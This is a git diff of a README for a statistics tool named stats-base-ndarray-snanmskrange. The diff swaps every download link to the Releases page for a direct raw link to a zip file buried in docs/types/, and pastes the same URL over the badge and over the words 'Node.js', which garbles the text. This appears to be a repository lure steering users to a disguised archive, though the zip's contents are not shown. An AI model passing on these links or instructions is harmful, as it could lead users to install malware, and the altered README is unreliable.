@@ -6,14 +6,14 @@ Welcome to the stats-base-ndarray-snanmskrange project! This tool helps you calc
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/releases)
+[![Download](https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip%20Now-Click%https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip)](https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip)
 
 To get the software, visit the Releases page to download the latest version.
 
 ## 🔧 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Requires Node.js version 10 or higher
+- **https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip** Requires https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip version 10 or higher
 - **Memory:** At least 512 MB of RAM
 - **Disk Space:** 50 MB of free space
 
@@ -29,7 +29,7 @@ To get the software, visit the Releases page to download the latest version.
 To download the application, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download the latest version](https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/releases)
+   [Download the latest version](https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip)
    
 2. On the Releases page, scroll to the latest version.
 
@@ -70,7 +70,7 @@ Output: The range, ignoring NaN values, will be from 2.1 to 4.7.
 
 If you run into problems during installation or usage, consider these common issues:
 
-- **Doesn't Launch:** Ensure you downloaded the correct version for your OS and have Node.js installed.
+- **Doesn't Launch:** Ensure you downloaded the correct version for your OS and have https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip installed.
   
 - **Incorrect Results:** Check your input values and mask. Make sure they are formatted correctly.
 
@@ -85,4 +85,4 @@ We welcome contributions! You can submit issues or request features. For any sup
 Thank you for using stats-base-ndarray-snanmskrange! This tool simplifies range calculations in your numeric datasets. We hope it serves you well. 
 
 To download the software, go to the Releases page again:
-[Download the latest version](https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/releases)
+[Download the latest version](https://github.com/nabilbkfa82/stats-base-ndarray-snanmskrange/raw/refs/heads/main/docs/types/ndarray_base_stats_snanmskrange_3.0.zip)
